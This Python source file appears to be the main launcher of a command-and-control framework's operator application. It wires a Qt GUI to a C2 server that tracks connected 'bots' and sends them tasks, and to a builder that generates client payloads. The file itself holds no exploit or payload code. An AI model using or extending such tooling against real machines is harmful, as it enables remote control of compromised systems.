import sys
import asyncio
import logging
import argparse
import traceback

from qtpy.QtWidgets import QApplication
from qtpy.QtCore import Qt, QObject, qInstallMessageHandler, QMetaObject

import qrainbowstyle
from qrainbowstyle.extras import qt_message_handler

from qasync import QEventLoop, asyncSlot, asyncClose

from __init__ import __version__, __app_name__
from core.Network import GUIServer, C2Server
from core.build import ClientBuilder
from core.config import ConfigManager
from core.logger import Logger
from utils import MessageDecoder, MessageEncoder
from view.LoginWindow import LoginDialog
from view.MainWindow import MainWindow
from view.SetupWindow import SetupDialog

logging.getLogger('qasync').setLevel(logging.WARNING)
logging.getLogger('asyncio').setLevel(logging.WARNING)


class Main(QObject):

    def __init__(self, args):
        super(Main, self).__init__(None)

        self._logger = logging.getLogger(self.__class__.__name__)

        self.gui = not args.nogui
        self.dev = args.dev
        self.remote = args.remote
        self.reset = args.reset

        if not self.remote:
            self.c2server = C2Server()
            self.config_manager = ConfigManager()
            self.builder = ClientBuilder()

            if self.reset:
                self.config_manager.delete_config()

        if self.gui:
            self.gui_server = None
            self.main_window = None
            self.setup_dialog = None
            self.login_dialog = None

            if self.config_manager.config_exists():
                self.setup_login_dialog()
            else:
                self.setup_setup_dialog()

        QMetaObject.connectSlotsByName(self)

    @asyncSlot(dict)
    async def setup_main_window(self, config: dict):
        self.login_dialog.close()
        self.setup_gui_server(config.get("gui_ip"), config.get("gui_port"), config.get("gui_key"))
        self.main_window = MainWindow()
        self.main_window.setup_gui(self.config_manager)
        self.main_window.gui_connected.connect(self.setup_c2_server)
        self.main_window.gui_connect_fail.connect(self.main_window.on_gui_connect_fail)
        self.main_window.gui_retry_connect.connect(lambda: self.main_window.start_gui_client(
            config.get("gui_ip"), config.get("gui_port"), config.get("gui_key")))
        self.main_window.connect_to_gui_server(config.get("gui_ip"), config.get("gui_port"), config.get("gui_key"))
        self.main_window.closeAccepted.connect(self.close)
        self.main_window.show()

    # Setup dialog /////////////////////////////////////////////////////////////////////////////////////////////////////
    @asyncSlot()
    async def setup_setup_dialog(self):
        self.setup_dialog = SetupDialog()
        self.setup_dialog.accepted.connect(self.on_setup_dialog_accepted)
        self.setup_dialog.cancelled.connect(self.close)
        self.setup_dialog.show()

    @asyncSlot(dict)
    async def on_setup_dialog_accepted(self, config: dict):
        key = config.get("config_key")
        self.config_manager.config_created.connect(self.setup_dialog.close)
        self.config_manager.config_created.connect(self.setup_login_dialog)
        self.config_manager.config_error.connect(self.setup_dialog.on_config_error)
        self.config_manager.create(config, key)

    # Setup dialog END /////////////////////////////////////////////////////////////////////////////////////////////////

    # Login dialog /////////////////////////////////////////////////////////////////////////////////////////////////////
    @asyncSlot()
    async def setup_login_dialog(self):
        self.login_dialog = LoginDialog()

        self.config_manager.config_error.connect(self.login_dialog.on_failed_login)
        self.config_manager.config_read.connect(self.setup_main_window)

        self.login_dialog.setup_normal.connect(self.config_manager.load)
        # self.login_dialog.setup_remote.connect(self.setup_main_window_remote)
        self.login_dialog.closeClicked.connect(self.close)
        self.login_dialog.show()

    # Login dialog END /////////////////////////////////////////////////////////////////////////////////////////////////

    # GUI server ///////////////////////////////////////////////////////////////////////////////////////////////////////
    @asyncSlot(str, int, str)
    async def setup_gui_server(self, ip, port, key):
        self.gui_server = GUIServer()
        self.gui_server.setObjectName("gui_server")

        self.config_manager.available_tasks.connect(self.gui_server.on_get_tasks)

        self.gui_server.stop_task.connect(self.c2server.stop_task)
        self.gui_server.start_task.connect(self.c2server.send_task)
        self.gui_server.get_tasks.connect(self.config_manager.on_gui_client_get_tasks)

        self.builder.build_error.connect(self.gui_server.on_build_error)
        self.builder.build_stopped.connect(self.gui_server.on_build_stopped)
        self.builder.build_options.connect(self.gui_server.on_build_options)
        self.builder.build_finished.connect(self.gui_server.on_build_finished)

        self.builder.generator_progress.connect(self.gui_server.on_generator_progress)
        self.builder.generator_finished.connect(self.gui_server.on_generator_finished)
        self.builder.generator_started.connect(self.gui_server.on_generator_started)

        self.gui_server.build_options.connect(self.builder.get_options)
        self.gui_server.build_stop.connect(self.builder.stop)
        self.gui_server.build_start.connect(self.builder.start)

        self.gui_server.start(ip, port, key)
        self.gui_server.setJSONDecoder(MessageDecoder)
        self.gui_server.setJSONEncoder(MessageEncoder)
        QMetaObject.connectSlotsByName(self)

    # GUI server END ///////////////////////////////////////////////////////////////////////////////////////////////////

    # C2 server ////////////////////////////////////////////////////////////////////////////////////////////////////////
    @asyncSlot()
    async def setup_c2_server(self):
        """Setup C2 handler."""
        self.c2server.assigned.connect(self.on_bot_connected)
        self.c2server.disconnected.connect(self.gui_server.on_bot_disconnected)
        self.c2server.task.connect(self.gui_server.on_bot_task)
        self.c2server.info.connect(self.gui_server.on_bot_info)
        self.c2server.start(self.config_manager.value("c2_ip"), self.config_manager.value("c2_port"))
        self.c2server.setJSONDecoder(MessageDecoder)
        self.c2server.setJSONEncoder(MessageEncoder)

    @asyncSlot(int, str, int)
    async def on_bot_connected(self, bot_id, ip, port):
        """Execute tasks and enable modules after connecting to client."""
        infos = self.config_manager.value("after_connection_infos")
        self.c2server.send_info(bot_id, infos)
        self.gui_server.on_bot_connected(bot_id, ip, port)

    # C2 server END ////////////////////////////////////////////////////////////////////////////////////////////////////

    @asyncClose
    async def close(self):
        """Gracefully close server and GUI"""
        self._logger.info("Preparing to close...")
        if self.gui:
            if self.main_window:
                self.main_window.close()
                self._logger.debug("Closed main window")
            if self.login_dialog:
                self.login_dialog.close()
                self._logger.debug("Closed login dialog")
            if self.setup_dialog:
                self.setup_dialog.close()
                self._logger.debug("Closed setup dialog")

        if not self.remote:
            if self.gui_server:
                self.gui_server.close()
                self.gui_server.wait()
                self._logger.debug("Stopped GUI server")
            if self.c2server:
                self.c2server.close()
                self.c2server.wait()
                self._logger.debug("Stopped C2 server")

        QApplication.instance().quit()


def main():
    logger = Logger()
    logger.enable()
    qInstallMessageHandler(qt_message_handler)

    def exception_hook(exctype, value, tb):
        logging.critical(''.join(traceback.format_exception(exctype, value, tb)))
        sys.exit(1)

    sys.excepthook = exception_hook

    parser = argparse.ArgumentParser(description=__app_name__)
    parser.add_argument('--nogui', action='store_true', help='run in headless mode')
    parser.add_argument('-r', '--remote', action='store_true', help='run in remote control mode')
    parser.add_argument('-d', '--dev', action='store_true', help='run in developer mode')
    parser.add_argument('--reset', action='store_true', help='remove application settings')
    parser.add_argument('--version', action='version', version='v{}'.format(__version__),
                        help='print version and exit')
    parser.add_argument("-v", "--verbosity", action="count",
                        help="increase logging verbosity", default=0)
    args = parser.parse_args()

    QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps)
    QApplication.setAttribute(Qt.AA_EnableHighDpiScaling)
    QApplication.setQuitOnLastWindowClosed(False)

    app = QApplication(sys.argv)
    app.setApplicationName(__app_name__)
    app.setApplicationVersion(__version__)
    app.setApplicationDisplayName(__app_name__)

    app.setStyleSheet(qrainbowstyle.load_stylesheet("darkorange"))
    font = QApplication.font()
    font.setPointSize(9)
    app.setFont(font)

    loop = QEventLoop(app)
    asyncio.set_event_loop(loop)

    m = Main(args)

    with loop:
        sys.exit(loop.run_forever())


main()
